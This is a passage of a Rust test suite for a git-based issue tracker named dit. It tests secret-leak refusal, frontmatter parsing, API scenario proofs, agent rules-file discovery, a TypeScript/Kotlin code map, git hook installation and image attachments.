        .morse_save_step("register", leaky.clone(), None, "farid")
        .unwrap_err();
    assert!(
        err.to_string().contains("Authorization") && err.to_string().contains("{{"),
        "names the field and the fix: {err}"
    );
    let err = dit
        .morse_create_scenario(
            "docs/api/x.md",
            "leak",
            "auth",
            None,
            leaky,
            vec![],
            "farid",
        )
        .unwrap_err();
    assert!(err.to_string().contains("Authorization"), "{err}");
    assert!(
        !dit.read_doc("docs/api/register.md")
            .unwrap()
            .contains("eyJ"),
        "git history does not forget, so nothing was written"
    );
}

/// Fixture `apostrophe_in_a_title`: an issue titled "Work plan's away lane"
/// was committed, then skipped by the indexer without a word, and no command
/// could find it. The frontmatter reader took the apostrophe for an opening
/// quote that never closed. A title is prose; people write apostrophes.
#[test]
fn an_issue_titled_with_an_apostrophe_is_indexed_and_found() {
    let dir = tempfile::tempdir().unwrap();
    let mut dit = workspace(dir.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx
        .create_issue(draft("Work plan's away lane showed no leave"))
        .unwrap();
    tx.commit("create 1 issue").unwrap();
    let report = dit.reindex(ReindexMode::All).unwrap();
    assert_eq!(report.skipped, 0, "{report:?}");
    assert_eq!(dit.resolve("#1").unwrap(), id);
    let found = dit.query("", None).unwrap();
    assert_eq!(found.len(), 1);
    assert_eq!(
        found[0].issue.title,
        "Work plan's away lane showed no leave"
    );
}

/// A file the indexer cannot read is named, with why. The apostrophe bug was
/// reported only as "1 file skipped": the issue was committed, no command
/// found it, and nothing said which file or what was wrong with it.
#[test]
fn a_skipped_file_is_named_with_its_reason() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Login timeout")).unwrap();
    tx.commit("create 1 issue").unwrap();
    let path = dit.get(id.as_str()).unwrap().unwrap().path;

    // A hand edit that leaves a quote open.
    let text = std::fs::read_to_string(tmp.path().join(&path)).unwrap();
    std::fs::write(
        tmp.path().join(&path),
        text.replace("title: Login timeout", "title: \"Login timeout"),
    )
    .unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add(&path).unwrap();
    repo.commit("hand edit").unwrap();

    let report = dit.reindex(ReindexMode::All).unwrap();
    assert_eq!(report.skipped, 1);
    assert_eq!(report.skipped_files.len(), 1, "{report:?}");
    assert_eq!(report.skipped_files[0].path, path);
    assert!(
        report.skipped_files[0].reason.contains("title"),
        "the reason names the key: {:?}",
        report.skipped_files[0].reason
    );
}

/// ADR 0024: a green sync records where it was proven. The environment is
/// part of the claim — the scenario above is proven on `local`, and nothing
/// is said about any other environment until someone runs it there.
#[test]
fn a_green_sync_records_the_environment_it_was_proven_in() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![
        (201, r#"{"data":{"id":"u_7"}}"#),
        (200, r#"{"token":"t0k"}"#),
        (200, r#"{"id":"u_7"}"#),
    ]);
    point_at(tmp.path(), port);

    let synced = dit.morse_sync("register", None, "farid").unwrap();
    assert!(synced.run.passed());
    assert_eq!(synced.env, "local", "the fence's env: names where it ran");

    let body = dit.read_doc("docs/api/register.md").unwrap();
    let fence = dit_parse::morse_fences(&body).remove(0);
    let parsed = dit_parse::parse_morse_scenario(&fence.body).unwrap();
    assert_eq!(parsed.proven.len(), 1, "{body}");
    assert_eq!(parsed.proven[0].env, "local");
    assert_eq!(parsed.proven[0].commit, synced.moved_to.clone().unwrap());
    assert_eq!(parsed.proven[0].on.len(), "2026-09-27".len());
    assert!(body.contains("# Register"), "the prose is intact: {body}");
}

#[test]
fn a_red_sync_records_no_proof() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![(500, r#"{"error":"boom"}"#)]);
    point_at(tmp.path(), port);

    let synced = dit.morse_sync("register", None, "farid").unwrap();
    assert!(!synced.run.passed());
    let body = dit.read_doc("docs/api/register.md").unwrap();
    assert!(!body.contains("proven:"), "{body}");
}

/// ADR 0024: a proof is judged like the pin. Fresh while the spec stands
/// where it was proven, stale the moment the spec moves — and the other
/// environment, never proven, is simply absent rather than assumed.
#[test]
fn a_proof_reads_fresh_until_the_spec_moves() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![
        (201, r#"{"data":{"id":"u_7"}}"#),
        (200, r#"{"token":"t0k"}"#),
        (200, r#"{"id":"u_7"}"#),
    ]);
    point_at(tmp.path(), port);
    assert!(dit
        .morse_sync("register", None, "farid")
        .unwrap()
        .run
        .passed());
    dit.reindex(ReindexMode::All).unwrap();

    let proofs = dit.morse_report().unwrap().scenarios[0].proofs.clone();
    assert_eq!(proofs.len(), 1, "{proofs:?}");
    assert_eq!(proofs[0].env, "local");
    assert!(proofs[0].holds(), "{proofs:?}");

    let repo = Repo::open(tmp.path()).unwrap();
    std::fs::write(
        tmp.path().join("api/openapi.yaml"),
        format!("{SPEC_V1}  /health:\n    get:\n      operationId: health\n"),
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("add a health endpoint").unwrap();
    dit.reindex(ReindexMode::All).unwrap();

    let proofs = dit.morse_report().unwrap().scenarios[0].proofs.clone();
    assert_eq!(
        proofs[0].health,
        dit_core::ProofHealth::Stale { commits: 1 }
    );
    assert!(!proofs[0].holds());
}

/// ADR 0024, end to end: with `proof: required`, an issue whose blockers are
/// done is still held back until the scenario it needs holds for its env.
/// This is the week the table in the ADR describes — "done upstream" kept
/// turning a downstream issue ready against a seam that did not answer.
#[test]
fn proof_required_holds_an_issue_until_its_scenario_is_proven_in_its_env() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let mut wf = dit_model::Workflow::default_workflow();
    wf.coordination.readiness.proof = dit_model::ProofMode::Required;
    let repo = Repo::open(tmp.path()).unwrap();
    std::fs::create_dir_all(tmp.path().join(".dit/schema")).unwrap();
    std::fs::write(
        tmp.path().join(".dit/schema/workflow.yaml"),
        dit_parse::write_workflow(&wf),
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("ask for proof").unwrap();
    dit.reindex(ReindexMode::All).unwrap();

    let screen = issue_with(
        &mut dit,
        "Sign-up screen",
        dit_core::FieldPatch {
            needs_scenarios: Some(vec!["register".into()]),
            env: Some("local".into()),
            ..Default::default()
        },
    );
    let ready = dit.ready(None, None).unwrap();
    assert!(ready.iter().all(|r| r.issue.issue.id != screen), "unproven");
    let held = dit.unproven(None).unwrap();
    assert_eq!(held.len(), 1, "{held:?}");
    assert_eq!(held[0].issue.issue.id, screen);
    assert_eq!(
        held[0].readiness,
        dit_model::Readiness::Unproven {
            scenarios: vec!["register".into()]
        }
    );

    let port = serve(vec![
        (201, r#"{"data":{"id":"u_7"}}"#),
        (200, r#"{"token":"t0k"}"#),
        (200, r#"{"id":"u_7"}"#),
    ]);
    point_at(tmp.path(), port);
    assert!(dit
        .morse_sync("register", None, "farid")
        .unwrap()
        .run
        .passed());
    dit.reindex(ReindexMode::All).unwrap();

    let ready = dit.ready(None, None).unwrap();
    assert!(
        ready.iter().any(|r| r.issue.issue.id == screen),
        "proven now"
    );
    assert!(dit.unproven(None).unwrap().is_empty());
}

/// `dit ai spec` names every rules file an agent must read: this workspace's
/// own, nested ones, and those of each linked code repository (read from its
/// HEAD, never checked out). A committed file is what counts — an untracked
/// draft in the working tree is nobody's rule yet.
#[test]
fn the_agent_spec_names_the_rules_files_here_and_in_linked_repos() {
    let tmp = tempfile::tempdir().unwrap();
    let backend = tmp.path().join("backend");
    let ws = tmp.path().join("ws");
    std::fs::create_dir_all(&backend).unwrap();
    std::fs::create_dir_all(&ws).unwrap();

    let code = Repo::init(&backend).unwrap();
    code.set_identity("DIT Test", "dit@test.local").unwrap();
    std::fs::create_dir_all(backend.join("services/auth")).unwrap();
    std::fs::write(backend.join("services/auth/AGENTS.md"), "# rules\n").unwrap();
    std::fs::write(backend.join("README.md"), "# backend\n").unwrap();
    code.add(".").unwrap();
    code.commit("rules").unwrap();

    let _ = workspace(&ws);
    std::fs::write(ws.join("CLAUDE.md"), "# workspace rules\n").unwrap();
    std::fs::create_dir_all(ws.join("apps/web")).unwrap();
    std::fs::write(ws.join("apps/web/CLAUDE.md"), "# web rules\n").unwrap();
    std::fs::create_dir_all(ws.join(".dit")).unwrap();
    std::fs::write(
        ws.join(".dit/config.yaml"),
        format!(
            "schema_version: 1\nlayout: root\nnumbering: local\nrepos:\n  - {{ name: backend, remote: \"{}\" }}\n",
            backend.display()
        ),
    )
    .unwrap();
    let repo = Repo::open(&ws).unwrap();
    repo.add(".").unwrap();
    repo.commit("rules and a linked repo").unwrap();
    // Untracked: in the working tree only, not yet anybody's rule.
    std::fs::write(ws.join("AGENTS.md"), "draft").unwrap();

    let dit = Dit::open(&ws).unwrap();
    let spec = dit.agent_spec();
    assert!(spec.contains("- `CLAUDE.md`\n"), "{spec}");
    assert!(spec.contains("- `apps/web/CLAUDE.md`\n"), "{spec}");
    assert!(
        spec.contains("- backend: `services/auth/AGENTS.md`\n"),
        "{spec}"
    );
    assert!(!spec.contains("README"), "only rules files are listed");
    assert!(
        !spec.contains("- `AGENTS.md`"),
        "an untracked draft is not listed"
    );
}

/// `dit ai init` in a repository that is not a DIT workspace is refused with
/// the command that makes it one. Writing a guide to a workspace that does
/// not exist left agents following rules for issues no command could create,
/// and an untracked `.dit-cache/` behind.
#[test]
fn agent_docs_refuse_a_repository_that_is_not_a_workspace() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    std::fs::write(tmp.path().join("CLAUDE.md"), "# rules\n").unwrap();
    assert!(!Dit::is_workspace(tmp.path()).unwrap());

    let err = dit
        .write_agent_docs(&dit_core::AgentDocOptions::default())
        .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("dit init"), "{msg}");
    assert!(msg.contains("--ai"), "{msg}");
    assert!(!tmp.path().join("docs/dit-for-agents.md").exists());
    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
    assert_eq!(claude, "# rules\n", "nothing written before the refusal");
}

// ---- The code map (ADR 0025) -----------------------------------------------

/// A small TypeScript root in the workspace itself: a page importing a hook
/// through a path alias and a view through a relative path, and a barrel.
fn code_workspace(path: &Path) -> Dit {
    let _ = workspace(path);
    let files: &[(&str, &str)] = &[
        (
            "tsconfig.json",
            "{\n  // comments are allowed in tsconfig\n  \"compilerOptions\": { \"paths\": { \"@/*\": [\"./src/*\"] } }\n}\n",
        ),
        (
            "src/crud/hooks.ts",
            "export function useThing() { return 1; }\nexport const LIMIT = 3;\n",
        ),
        (
            "src/crud/index.ts",
            "export { useThing } from \"./hooks\";\n",
        ),
        (
            "src/pages/Page.tsx",
            "import { useThing } from \"@/crud/hooks\";\nimport { View } from \"./View\";\nexport function Page() { useThing(); return <View />; }\n",
        ),
        (
            "src/pages/View.tsx",
            "export function View() { return null; }\n",
        ),
        (
            "src/pages/Other.tsx",
            "import { useThing } from \"@/crud\";\nexport function Other() { return useThing(); }\n",
        ),
        ("src/generated/Model.ts", "export type Model = { id: string };\n"),
    ];
    for (rel, text) in files {
        let p = path.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }
    std::fs::create_dir_all(path.join(".dit")).unwrap();
    std::fs::write(
        path.join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\ncode:\n  - { id: web, include: [\"src/**\"], generated: [\"src/generated/**\"] }\n",
    )
    .unwrap();
    let repo = Repo::open(path).unwrap();
    repo.add(".").unwrap();
    repo.commit("a small web app").unwrap();
    Dit::open(path).unwrap()
}

#[test]
fn the_code_map_answers_who_uses_what_through_aliases_and_barrels() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = code_workspace(tmp.path());
    let report = dit.refresh_code().unwrap();
    assert_eq!(report.parsed, 6, "{report:?}");

    // Who uses the hook: Page imports it by alias, Other through the barrel.
    let users = dit.code_users("useThing").unwrap();
    let paths: Vec<&str> = users.iter().map(|u| u.path.as_str()).collect();
    assert!(paths.contains(&"src/pages/Page.tsx"), "{users:?}");
    assert!(
        paths.contains(&"src/pages/Other.tsx"),
        "through the barrel: {users:?}"
    );

    // Who uses the hook's file: the same two, the barrel one named with it.
    let file_users = dit.code_users("src/crud/hooks.ts").unwrap();
    let other = file_users
        .iter()
        .find(|u| u.path == "src/pages/Other.tsx")
        .expect("through the barrel");
    assert_eq!(
        other.via.as_deref(),
        Some("src/crud/index.ts"),
        "{file_users:?}"
    );
    assert!(
        file_users.iter().all(|u| u.path != "src/crud/index.ts"),
        "the barrel is a hop, not a user"
    );

    // What the page depends on, resolved to files.
    let uses = dit.code_uses("src/pages/Page.tsx").unwrap();
    let targets: Vec<Option<&str>> = uses.imports.iter().map(|i| i.target.as_deref()).collect();
    assert!(targets.contains(&Some("src/crud/hooks.ts")), "{uses:?}");
    assert!(targets.contains(&Some("src/pages/View.tsx")), "{uses:?}");
    assert!(uses.calls.iter().any(|c| c == "useThing"), "{uses:?}");

    // The chain from the page to the hook.
    let path = dit
        .code_path("src/pages/Other.tsx", "src/crud/hooks.ts")
        .unwrap();
    assert_eq!(
        path,
        vec![
            "src/pages/Other.tsx",
            "src/crud/index.ts",
            "src/crud/hooks.ts"
        ]
    );

    // Hubs: the hook file is the most depended-on.
    let hubs = dit.code_hubs(None, 3, false).unwrap();
    assert_eq!(hubs[0].path, "src/crud/hooks.ts", "{hubs:?}");

    // Generated code is marked as such.
    let model = dit.code_explain("src/generated/Model.ts").unwrap();
    assert!(model.generated, "{model:?}");

    // Unchanged files are not parsed again.
    assert_eq!(dit.refresh_code().unwrap().parsed, 0);
}

/// The cache is keyed by blob, so a fixed extractor would never reach files
/// that did not change. A different extractor version re-reads everything.
#[test]
fn a_new_extractor_version_re_reads_every_file() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = code_workspace(tmp.path());
    assert_eq!(dit.refresh_code().unwrap().parsed, 6);
    dit.invalidate_code_map().unwrap();
    assert_eq!(
        dit.refresh_code().unwrap().parsed,
        6,
        "an index written by another extractor is read again"
    );
    assert_eq!(dit.refresh_code().unwrap().parsed, 0);
}

/// ADR 0025 milestone 2: a map entry is judged against the code on every
/// refresh. Unconfirmed until someone confirms it; broken the moment a path
/// it names matches nothing; stale once a file it points at changes after
/// the pin — and only a person moves the pin.
#[test]
fn map_entries_are_judged_against_the_code_and_confirmed_by_a_person() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = code_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/code/map.md",
        "# Where things live\n\n```dit-map\nmap: web\nentries:\n  - task: Use the shared hook\n    example: \"web:src/crud/hooks.ts\"\n    change: [ \"web:src/pages/\" ]\n    never: [ \"web:src/generated/**\" ]\n  - task: A retired pattern\n    example: \"web:src/legacy/Old.tsx\"\n```\n",
    );
    dit.reindex(ReindexMode::State).unwrap();
    dit.refresh_code().unwrap();

    let entries = dit.code_map_report().unwrap();
    assert_eq!(entries.len(), 2, "{entries:?}");
    assert_eq!(entries[0].health, dit_core::MapHealth::Unconfirmed);
    assert!(
        matches!(&entries[1].health, dit_core::MapHealth::Broken { reasons } if reasons[0].contains("src/legacy/Old.tsx")),
        "{entries:?}"
    );

    // A map with a broken entry cannot be confirmed: the pin would claim it holds.
    let refused = dit.code_map_confirm("web", "farid").unwrap_err();
    assert!(
        refused.to_string().contains("A retired pattern"),
        "{refused}"
    );
    write_doc(
        &mut dit,
        "docs/code/map.md",
        "# Where things live\n\n```dit-map\nmap: web\nentries:\n  - task: Use the shared hook\n    example: \"web:src/crud/hooks.ts\"\n    change: [ \"web:src/pages/\" ]\n    never: [ \"web:src/generated/**\" ]\n```\n",
    );
    dit.reindex(ReindexMode::State).unwrap();
    dit.refresh_code().unwrap();

    let pinned = dit.code_map_confirm("web", "farid").unwrap();
    assert_eq!(pinned.len(), 1, "one root pinned: {pinned:?}");
    dit.reindex(ReindexMode::State).unwrap();
    dit.refresh_code().unwrap();
    assert_eq!(
        dit.code_map_report().unwrap()[0].health,
        dit_core::MapHealth::Holds
    );

    // The example is rewritten after the pin: the entry is stale.
    std::fs::write(
        tmp.path().join("src/crud/hooks.ts"),
        "export function useThing() { return 2; }\n",
    )
    .unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add(".").unwrap();
    repo.commit("rework the hook").unwrap();
    dit.reindex(ReindexMode::State).unwrap();
    dit.refresh_code().unwrap();
    assert_eq!(
        dit.code_map_report().unwrap()[0].health,
        dit_core::MapHealth::Stale { commits: 1 }
    );
}

/// ADR 0025 milestone 3: Kotlin resolves by declaration, a same-package use
/// is an edge although nothing imports it, and path literals are read
/// against the registered specs — a call, an orphan, or too generic to name.
#[test]
fn kotlin_resolves_by_declaration_and_literals_meet_the_spec() {
    let tmp = tempfile::tempdir().unwrap();
    let path = tmp.path();
    let _ = workspace(path);
    let files: &[(&str, &str)] = &[
        (
            "app/data/Repo.kt",
            "package com.acme.data\n\nclass Repo\n\nobject Routes {\n    const val BASE = \"api/v1/users\"\n}\n",
        ),
        (
            "app/data/Helper.kt",
            "package com.acme.data\n\nfun helper(r: Repo) = r\n",
        ),
        (
            "app/ui/Screen.kt",
            "package com.acme.ui\n\nimport com.acme.data.Repo\nimport kotlinx.coroutines.launch\n\nclass Screen(val repo: Repo) {\n    fun open(id: String) = get(\"${Routes.BASE}/$id\")\n}\n",
        ),
        (
            "web/api.ts",
            "const P = \"api/v1/users\";\nexport const U = {\n  one: (id: string) => `${P}/${id}`,\n  gone: \"api/v1/teams/x/y\",\n  any: (a: string, b: string) => `api/${a}/${b}`,\n};\n",
        ),
        (
            "api/openapi.yaml",
            "openapi: 3.0.3\npaths:\n  /api/v1/users:\n    get:\n      operationId: listUsers\n  /api/v1/users/{id}:\n    get:\n      operationId: getUser\n  /api/v1/users/bulk:\n    post:\n      operationId: bulkUsers\n",
        ),
    ];
    for (rel, text) in files {
        let p = path.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }
    std::fs::create_dir_all(path.join(".dit")).unwrap();
    std::fs::write(
        path.join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\nspecs:\n  - { id: users, path: api/openapi.yaml }\ncode:\n  - { id: app, include: [\"app/**\"] }\n  - { id: web, include: [\"web/**\"] }\n",
    )
    .unwrap();
    let repo = Repo::open(path).unwrap();
    repo.add(".").unwrap();
    repo.commit("a kotlin client and a web client").unwrap();
    let mut dit = Dit::open(path).unwrap();
    dit.reindex(ReindexMode::State).unwrap();
    let report = dit.refresh_code().unwrap();
    assert_eq!(
        report.unresolved, 0,
        "a library import is external: {report:?}"
    );

    // The explicit import, and the same-package type use nobody imported.
    let users: Vec<String> = dit
        .code_users("Repo")
        .unwrap()
        .into_iter()
        .map(|u| u.path)
        .collect();
    assert!(users.contains(&"app/ui/Screen.kt".to_owned()), "{users:?}");
    assert!(
        users.contains(&"app/data/Helper.kt".to_owned()),
        "{users:?}"
    );

    let api = dit.code_api().unwrap();
    let call = |resolved: &str| api.calls.iter().find(|c| c.resolved == resolved);
    // A constant from the file, and one from an object in another file.
    let web = call("api/v1/users/${id}").expect("the web literal, constant put back");
    let ops: Vec<&str> = web
        .operations
        .iter()
        .map(|o| o.operation_id.as_str())
        .collect();
    assert_eq!(ops, ["getUser"], "the closest fit only, not /bulk");
    assert!(
        api.calls
            .iter()
            .any(|c| c.root == "app" && c.resolved == "api/v1/users/${id}"),
        "the Kotlin literal through Routes.BASE: {api:?}"
    );
    let orphans: Vec<&str> = api.orphans().map(|c| c.resolved.as_str()).collect();
    assert_eq!(orphans, ["api/v1/teams/x/y"]);
    assert_eq!(api.generic, 1, "api/${{a}}/${{b}} names no one path");
    assert!(api.unproven().iter().any(|o| o.operation_id == "getUser"));

    // The focus view carries the same calls, for the one file in focus.
    let focus = dit.code_neighbourhood("web/api.ts").unwrap();
    let calls: Vec<(&str, usize)> = focus
        .api_calls
        .iter()
        .map(|c| (c.resolved.as_str(), c.operations.len()))
        .collect();
    assert!(calls.contains(&("api/v1/users/${id}", 1)), "{calls:?}");
    assert!(
        calls.contains(&("api/v1/teams/x/y", 0)),
        "the orphan too: {calls:?}"
    );
}

/// A repository that is not a DIT workspace maps itself: no config, the index
/// under `.dit/code/` where a person can find it, and nothing in it ever
/// reaches a commit — the directory ignores itself.
#[test]
fn any_repository_maps_itself_under_dit_code_without_committing_it() {
    let tmp = tempfile::tempdir().unwrap();
    let path = tmp.path();
    let repo = Repo::init(path).unwrap();
    repo.set_identity("DIT Test", "dit@test.local").unwrap();
    let files: &[(&str, &str)] = &[
        (
            "src/hooks.ts",
            "export function useThing() { return 1; }\n",
        ),
        (
            "src/Page.tsx",
            "import { useThing } from \"./hooks\";\nexport function Page() { return useThing(); }\n",
        ),
        (
            "src/client.ts",
            "// Code generated by a tool. DO NOT EDIT.\nexport const base = 1;\n",
        ),
    ];
    for (rel, text) in files {
        let p = path.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }
    repo.add(".").unwrap();
    repo.commit("a repository with no DIT in it").unwrap();

    let mut dit = Dit::open_code(path).unwrap();
    let report = dit.refresh_code().unwrap();
    assert_eq!(report.parsed, 3, "{report:?}");
    assert!(path.join(".dit/code/index.sqlite").exists());
    assert!(path.join(".dit/code/.gitignore").exists());
    assert!(
        !Dit::is_workspace(path).unwrap(),
        "mapping a repository does not make it a workspace"
    );

    let users = dit.code_users("useThing").unwrap();
    assert_eq!(users.len(), 1, "{users:?}");
    assert_eq!(users[0].path, "src/Page.tsx");
    assert!(
        dit.code_explain("src/client.ts").unwrap().generated,
        "by its header"
    );

    // Nothing to commit: the map ignores itself.
    assert!(
        repo.is_clean().unwrap(),
        "the map must never show as a change"
    );
}

/// A blob read once is never parsed again, whatever path or branch brings it
/// back: switching away and back costs a cache read, not a parse.
#[test]
fn a_blob_seen_before_comes_from_the_cache_not_the_parser() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = code_workspace(tmp.path());
    assert_eq!(dit.refresh_code().unwrap().parsed, 6);
    let repo = Repo::open(tmp.path()).unwrap();
    let hooks = tmp.path().join("src/crud/hooks.ts");
    let before = std::fs::read_to_string(&hooks).unwrap();

    // Away: a new blob is parsed.
    std::fs::write(&hooks, "export function useThing() { return 2; }\n").unwrap();
    repo.add(".").unwrap();
    repo.commit("change the hook").unwrap();
    let away = dit.refresh_code().unwrap();
    assert_eq!((away.parsed, away.reused), (1, 0), "{away:?}");

    // Back: the old blob returns, and nothing is parsed.
    std::fs::write(&hooks, &before).unwrap();
    repo.add(".").unwrap();
    repo.commit("back to the first hook").unwrap();
    let back = dit.refresh_code().unwrap();
    assert_eq!((back.parsed, back.reused), (0, 1), "{back:?}");
    let users = dit.code_users("useThing").unwrap();
    assert!(
        users.iter().any(|u| u.path == "src/pages/Page.tsx"),
        "{users:?}"
    );
}

/// A root pinned to a ref maps that ref, whatever the checkout has on HEAD —
/// a linked repository someone switched to a feature branch does not move
/// the map.
#[test]
fn a_root_pinned_to_a_ref_maps_that_ref_not_the_checkout() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = code_workspace(tmp.path());
    let repo = Repo::open(tmp.path()).unwrap();
    repo.git(&["branch", "stable"]).unwrap();
    // HEAD moves on: a new page importing the hook.
    std::fs::write(
        tmp.path().join("src/pages/New.tsx"),
        "import { useThing } from \"@/crud/hooks\";\nexport const New = () => useThing();\n",
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("a new page on HEAD").unwrap();
    std::fs::write(
        tmp.path().join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\ncode:\n  - { id: web, include: [\"src/**\"], ref: stable }\n",
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("pin the map to stable").unwrap();
    let mut dit = {
        drop(dit);
        Dit::open(tmp.path()).unwrap()
    };
    dit.refresh_code().unwrap();
    let users: Vec<String> = dit
        .code_users("useThing")
        .unwrap()
        .into_iter()
        .map(|u| u.path)
        .collect();
    assert!(
        users.contains(&"src/pages/Page.tsx".to_owned()),
        "{users:?}"
    );
    assert!(
        !users.contains(&"src/pages/New.tsx".to_owned()),
        "HEAD's new page is not on stable: {users:?}"
    );
}

/// The background refresh is opt-in and polite: it goes in as one marked
/// block after an existing hook's shebang, comes back out leaving the hook as
/// it was, and refuses when the hooks are committed files.
#[test]
fn code_hooks_install_beside_existing_ones_and_refuse_committed_hooks() {
    let tmp = tempfile::tempdir().unwrap();
    let path = tmp.path();
    let repo = Repo::init(path).unwrap();
    repo.set_identity("DIT Test", "dit@test.local").unwrap();
    let mine = "#!/bin/sh\necho mine\nexit 0\n";
    let hook = path.join(".git/hooks/post-merge");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    std::fs::write(&hook, mine).unwrap();

    let installed = dit_core::code::install_code_hooks(path).unwrap();
    assert_eq!(installed.len(), 4, "{installed:?}");
    let with = std::fs::read_to_string(&hook).unwrap();
    assert!(with.starts_with("#!/bin/sh\n# >>> dit code map"), "{with}");
    assert!(
        with.ends_with("echo mine\nexit 0\n"),
        "the hook keeps what it had"
    );
    assert!(
        dit_core::code::install_code_hooks(path).unwrap().is_empty(),
        "installing twice changes nothing"
    );

    dit_core::code::uninstall_code_hooks(path).unwrap();
    assert_eq!(std::fs::read_to_string(&hook).unwrap(), mine);
    assert!(
        !path.join(".git/hooks/post-commit").exists(),
        "a hook that held only the block is gone"
    );

    // A hook manager's committed hooks directory is the team's, not ours.
    std::fs::create_dir_all(path.join(".husky")).unwrap();
    std::fs::write(path.join(".husky/post-merge"), mine).unwrap();
    repo.add(".").unwrap();
    repo.commit("a hook manager").unwrap();
    repo.git(&["config", "core.hooksPath", ".husky"]).unwrap();
    let refused = dit_core::code::install_code_hooks(path).unwrap_err();
    assert!(refused.to_string().contains("committed"), "{refused}");
}

/// The map's picture is drawn one folder at a time: subfolders and files as
/// units, imports between them counted, imports across the edge kept as
/// inbound and outbound — and a file in focus with both of its sides.
#[test]
fn the_code_map_is_drawn_one_folder_at_a_time_and_one_file_in_focus() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = code_workspace(tmp.path());
    dit.refresh_code().unwrap();

    let top = dit.code_overview("web", "src").unwrap();
    let units: Vec<(&str, bool, usize)> = top
        .units
        .iter()
        .map(|u| (u.path.as_str(), u.folder, u.files))
        .collect();
    assert_eq!(
        units,
        [
            ("src/crud", true, 2),
            ("src/generated", true, 1),
            ("src/pages", true, 3)
        ]
    );
    let edge = top
        .edges
        .iter()
        .find(|e| e.from == "src/pages" && e.to == "src/crud")
        .expect("pages import crud");
    assert_eq!(edge.imports, 2, "Page → hooks and Other → the barrel");
    assert_eq!(top.units[1].generated, 1);

    let pages = dit.code_overview("web", "src/pages").unwrap();
    let page = pages
        .units
        .iter()
        .find(|u| u.path == "src/pages/Page.tsx")
        .unwrap();
    assert!(!page.folder);
    assert_eq!(page.outbound, 1, "its import of the hook leaves the folder");
    assert!(pages
        .edges
        .iter()
        .any(|e| e.from == "src/pages/Page.tsx" && e.to == "src/pages/View.tsx"));

    // The whole root at once, edges by index.
    let all = dit.code_graph("web").unwrap();
    assert_eq!(all.files.len(), 6);
    let idx = |p: &str| all.files.iter().position(|f| f.0 == p).unwrap() as u32;
    assert!(all
        .edges
        .contains(&(idx("src/pages/Page.tsx"), idx("src/crud/hooks.ts"))));
    let hooks = &all.files[idx("src/crud/hooks.ts") as usize];
    assert_eq!(hooks.2, 2, "Page and the barrel import it: {hooks:?}");
    assert!(all.files[idx("src/generated/Model.ts") as usize].1);

    let focus = dit.code_neighbourhood("src/crud/hooks.ts").unwrap();
    let users: Vec<(&str, Option<&str>)> = focus
        .users
        .iter()
        .map(|u| (u.path.as_str(), u.via.as_deref()))
        .collect();
    assert!(users.contains(&("src/pages/Page.tsx", None)), "{users:?}");
    assert!(
        users.contains(&("src/pages/Other.tsx", Some("src/crud/index.ts"))),
        "{users:?}"
    );
    assert!(focus.defines.contains(&"useThing".to_owned()));
    let page = dit.code_neighbourhood("src/pages/Page.tsx").unwrap();
    let uses: Vec<&str> = page.uses.iter().map(|u| u.path.as_str()).collect();
    assert_eq!(uses, ["src/crud/hooks.ts", "src/pages/View.tsx"]);
}

// ---- Image attachments (ADR 0026) ------------------------------------------

const SHOT: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\x00\x00\x00\x10 a screenshot \xff\xfe";

#[test]
fn an_image_attached_to_a_page_is_one_commit_beside_it_and_reads_back() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    write_doc(&mut dit, "docs/guide.md", "# Guide\n");
    let mut tx = dit.transaction("farid").unwrap();
    let attached = tx
        .add_attachment(
            &dit_core::AttachTarget::Doc("docs/guide.md".into()),
            "Screen Shot 1.png",
            SHOT,
        )
        .unwrap();
    assert!(
        attached
            .path
            .starts_with("docs/attachments/guide-screen-shot-1-")
            && attached.path.ends_with(".png"),
        "{}",
        attached.path
    );
    assert_eq!(
        attached.link,
        attached.path.trim_start_matches("docs/"),
        "relative to the page"
    );
    let sha = tx
        .commit(&format!("dit attach: {}", attached.path))
        .unwrap();
